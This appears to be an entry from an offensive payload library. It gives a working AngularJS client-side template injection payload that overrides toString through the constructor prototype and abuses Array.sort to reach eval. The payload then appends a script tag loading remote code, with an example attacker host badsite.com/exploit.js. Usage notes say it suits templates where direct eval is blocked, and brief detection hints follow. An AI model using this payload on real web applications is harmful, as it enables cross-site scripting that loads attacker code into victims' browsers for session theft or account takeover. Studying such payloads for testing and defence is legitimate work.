---
id: cfd8ed8b-588c-41e1-b518-9d44245b617f
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.760531+00:00'
updated_at: '2023-04-10T20:24:53.221835+00:00'
tags:
  - CSTI
  - Blind XSS
  - AngularJS
platforms:
  - Web
  - Browser
validated: true
---

# AngularJS-ToString-Sort-Bypass-Script-Injection

## Code

```javascript
{{
    toString.constructor.prototype.toString=toString.constructor.prototype.call;
    ["a",'eval("var _ = document.createElement(\'script\');
    _.src=\'//localhost/m\';
    document.getElementsByTagName(\'body\')[0].appendChild(_)")'].sort(toString.constructor);
}}
```

## Description

This payload overrides the toString method to use call, then leverages the Array.sort callback to execute eval and inject a script tag for blind remote loading in AngularJS templates.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| localhost/m | Malicious script source | //badsite.com/exploit.js |

## Usage

Suitable for templates where direct eval is blocked; inject to trigger sort-based execution and append the external script.

## Detection

- Array.sort misuse in dynamic code analysis.
- toString overrides in prototype monitoring.
- External script loads from template-evaluated code.

## Related

- [[procedures/Client-Side-Template-Injection-using-Blind-XSS]]
